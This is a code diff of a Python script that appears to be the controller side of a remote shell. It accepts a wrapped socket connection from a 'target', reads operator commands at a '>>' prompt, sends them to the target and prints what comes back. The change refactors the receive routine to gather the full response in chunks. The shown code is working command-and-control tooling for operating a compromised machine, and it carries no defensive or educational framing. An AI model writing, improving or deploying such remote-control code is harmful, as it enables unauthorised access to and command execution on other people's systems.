@@ -16,9 +16,16 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     conn, addr = wrapS.accept()
     print("[+] Connection established with target ", addr)
 
-    def receive():
-        data = conn.recv(1024)
+
+    def receive_data():
+        data = b""
+        while True:
+            part = conn.recv(1024)
+            data += part
+            if len(part) < 1024:
+                break
         return data
+
 
     def send(data):
         conn.send(data.encode())
@@ -29,9 +36,9 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             wrapS.close()
             print("[+] Connection closed")
             exit()
-        return receive()
+        return receive_data()
 
     while True:
         command = input(">> ")
         data = command_execution(command)
-        print(data.decode("utf-8", "ignore"))
+        print(data.decode("utf-8", "ignore"))  # decoding happens here again
